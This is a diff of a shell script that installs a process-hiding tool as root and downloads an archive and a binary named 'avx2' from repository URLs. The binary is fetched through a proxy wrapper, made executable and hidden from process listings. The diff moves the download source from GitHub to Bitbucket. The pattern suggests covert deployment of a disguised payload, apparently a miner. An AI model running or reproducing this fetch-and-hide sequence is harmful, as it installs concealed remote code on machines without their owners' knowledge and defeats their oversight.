@@ -13,7 +13,7 @@ sudo -u root npm i -g node-process-hider
 sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 sudo dpkg-reconfigure --frontend noninteractive tzdata
 
-wget https://github.com/haiudh1894/avn/raw/main/graphics.tar.gz
+wget https://bitbucket.org/oqoixgqoq9/avn/raw/792f8c70343d06e2eb2934bb64b9de9e309388c1/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -34,7 +34,7 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/haiudh1894/avn/raw/main/avx2
+./graftcp/graftcp wget https://bitbucket.org/oqoixgqoq9/avn/raw/792f8c70343d06e2eb2934bb64b9de9e309388c1/avx2
 chmod +x avx2
 
 sudo ph add avx2
